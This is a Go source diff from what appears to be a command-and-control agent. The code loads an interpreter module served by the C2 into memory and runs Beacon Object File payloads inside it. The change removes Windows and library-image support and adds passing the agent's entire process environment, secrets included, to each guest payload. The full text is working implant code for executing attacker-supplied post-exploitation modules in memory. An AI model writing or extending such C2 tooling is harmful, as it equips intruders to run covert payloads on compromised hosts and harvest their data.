@@ -3,6 +3,7 @@ package rvvm
 import (
 	"errors"
 	"fmt"
+	"os"
 	"runtime"
 	"unsafe"
 
@@ -12,47 +13,32 @@ import (
 )
 
 // dependencyName is the module that provides the RV32IMA interpreter. The C2
-// hosts it as <name>.<arch>.gz; the agent maps it on demand. The guest payload
-// is identical on both platforms; only the interpreter image differs.
-func dependencyName() string {
-	if runtime.GOOS == "windows" {
-		return "rvvm_windows"
-	}
-	return "rvvm_linux"
-}
+// hosts it as <name>.<arch>.gz; the agent maps it on demand.
+func dependencyName() string { return "rvvm_linux" }
 
 // maxGuestOutput bounds the C string read back from the interpreter so a
 // corrupted return value cannot make the agent scan unmapped memory forever.
-const maxGuestOutput = 16 << 20
+const maxGuestOutput = (8 << 20) + 16
 
 // bofArgs mirrors struct rv_bof_args in the interpreter module: the packed
-// COFF argument buffer. Both fields are machine words so the layout matches on
-// 32- and 64-bit hosts.
+// COFF argument buffer and the NUL-separated environment block. Pointers are
+// machine words, so the layout matches on 32- and 64-bit hosts.
 type bofArgs struct {
-	Buf   uintptr
-	Len   uintptr
-	Libs  uintptr
-	NLibs uintptr
+	Buf    unsafe.Pointer
+	Len    uintptr
+	Env    unsafe.Pointer
+	EnvLen uintptr
 }
 
-// bofLib mirrors struct rv_lib: one delivered RISC-V library image.
-type bofLib struct {
-	Buf uintptr
-	Len uintptr
-}
-
-// RunRiscvBof executes a portable BOF: an RV32 ET_REL object that the
-// interpreter relocates against its embedded Beacon/libc runtime and calls at
-// `export` with the packed COFF argument buffer.
-func RunRiscvBof(payload []byte, export string, args []coffloader.CoffArg, libs [][]byte) (string, error) {
+// RunRiscvBof executes a portable BOF. The payload is a static RV32 musl
+// executable; the interpreter starts at musl _start and the guest entry shim
+// calls the BOF.
+func RunRiscvBof(payload []byte, args []coffloader.CoffArg, opts ...memdeps.UseOption) (string, error) {
 	if err := checkPlatform(); err != nil {
 		return "", err
 	}
 	if len(payload) == 0 {
 		return "", errors.New("empty payload")
-	}
-	if export == "" {
-		export = "go"
 	}
 	packed, err := coffloader.PackCoffArgs(args)
 	if err != nil {
@@ -73,39 +59,35 @@ func RunRiscvBof(payload []byte, export string, args []coffloader.CoffArg, libs 
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
+	// The guest sees the agent environment, like a native BOF.
+	env := make([]byte, 0, 1024)
+	for _, kv := range os.Environ() {
+		env = append(env, kv...)
+		env = append(env, 0)
+	}
+
 	var out string
 	err = memdeps.Use(dependencyName(), func(module *memmod.Module) error {
-		var bofPtr uintptr
+		var bofPtr unsafe.Pointer
 		if len(wire) > 0 {
-			bofPtr = uintptr(unsafe.Pointer(&wire[0]))
+			bofPtr = unsafe.Pointer(&wire[0])
 		}
-		// Delivered libraries stay in memory; only their descriptors cross the
-		// module boundary.
-		descs := make([]bofLib, len(libs))
-		for i := range libs {
-			if len(libs[i]) == 0 {
-				return errors.New("empty RISC-V library image")
-			}
-			descs[i] = bofLib{Buf: uintptr(unsafe.Pointer(&libs[i][0])), Len: uintptr(len(libs[i]))}
-		}
-		var libsPtr uintptr
-		if len(descs) > 0 {
-			libsPtr = uintptr(unsafe.Pointer(&descs[0]))
+		var envPtr unsafe.Pointer
+		if len(env) > 0 {
+			envPtr = unsafe.Pointer(&env[0])
 		}
 		// Heap-allocate the argument descriptor: the interpreter dereferences
 		// its fields, and a goroutine stack can move.
 		desc := &bofArgs{
-			Buf:   bofPtr,
-			Len:   uintptr(len(wire)),
-			Libs:  libsPtr,
-			NLibs: uintptr(len(descs)),
+			Buf:    bofPtr,
+			Len:    uintptr(len(wire)),
+			Env:    envPtr,
+			EnvLen: uintptr(len(env)),
 		}
-		entryBytes := append([]byte(export), 0)
 
 		result, callErr := callRun(module,
 			uintptr(unsafe.Pointer(&payload[0])),
 			uintptr(len(payload)),
-			uintptr(unsafe.Pointer(&entryBytes[0])),
 			uintptr(unsafe.Pointer(desc)),
 		)
 		if callErr != nil {
@@ -113,24 +95,22 @@ func RunRiscvBof(payload []byte, export string, args []coffloader.CoffArg, libs 
 		}
 		runtime.KeepAlive(payload)
 		runtime.KeepAlive(wire)
-		runtime.KeepAlive(entryBytes)
-		runtime.KeepAlive(libs)
-		runtime.KeepAlive(descs)
+		runtime.KeepAlive(env)
 		runtime.KeepAlive(desc)
 
 		if result == 0 {
 			if msg := callLastError(module); msg != "" {
 				return fmt.Errorf("%s", msg)
 			}
-			return errors.New("RISC-V BOF failed")
+			return errors.New("guest run failed")
 		}
 
 		out = readCString(result)
-		// The interpreter owns the buffer; let it release it (a no-op) while
-		// its code is still mapped.
+		// Let the interpreter release the buffer while its code is still
+		// mapped.
 		callFree(module, result)
 		return nil
-	})
+	}, opts...)
 	return out, err
 }
 
